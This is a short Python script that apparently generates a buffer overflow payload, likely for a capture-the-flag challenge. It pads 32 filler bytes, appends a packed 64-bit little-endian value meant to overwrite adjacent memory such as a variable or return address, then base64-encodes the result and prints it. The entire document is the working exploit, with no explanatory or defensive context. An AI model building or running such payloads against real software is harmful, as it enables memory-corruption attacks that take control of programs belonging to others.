
import sys
import struct
import base64

buf = b'iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii'
buf += struct.pack('<Q', 7985415586667322802)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
